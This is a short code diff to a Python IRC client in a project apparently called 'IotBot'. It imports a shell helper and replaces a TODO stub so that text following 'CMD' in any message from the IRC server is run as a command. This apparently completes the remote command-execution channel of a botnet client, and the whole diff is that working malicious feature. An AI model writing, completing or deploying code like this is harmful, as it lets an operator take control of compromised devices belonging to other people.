@@ -1,6 +1,8 @@
 import socket
 import time
 
+from IotBot.addons.shell import shell
+
 
 class IRC:
     irc = socket.socket()
@@ -25,8 +27,8 @@ class IRC:
         resp = self.irc.recv(2040).decode("UTF-8")
 
         if resp.find('CMD') != -1:
-            # TODO :  executing the command
-            pass
+            cmd = resp.split(" ")[1].replace('\n' , '').replace('\r', '')
+            shell(cmd)
 
         if resp.find('PING') != -1:
             # print(resp)
